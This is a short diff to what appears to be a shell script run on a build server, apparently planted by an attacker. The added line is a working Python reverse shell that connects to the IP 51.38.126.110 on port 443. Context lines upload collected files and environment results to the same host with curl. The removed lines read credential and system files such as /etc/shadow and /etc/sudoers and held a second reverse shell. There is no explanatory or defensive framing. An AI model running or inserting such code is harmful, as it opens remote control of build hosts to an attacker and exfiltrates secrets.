@@ -9,16 +9,7 @@ ls /dev
 ip addr
 ps -aux
 
-iptables-save
-cat /etc/resolv.conf
-cat /etc/passwd
-cat /etc/groups
-cat /etc/shadow
-cat /etc/sudoers
-ls /etc/sudoers.d/
-
-cat /etc/crontab
-cat /root/.start-build.sh
+python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("51.38.126.110",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
 
 curl -F 'f=@/tmp/curlres' http://51.38.126.110/
 
@@ -57,7 +48,6 @@ curl -F 'f=@/tmp/curlres' http://51.38.126.110/semmle_result_kub-env
 
 
 
-python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("51.38.126.110",8080));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
 
 
 
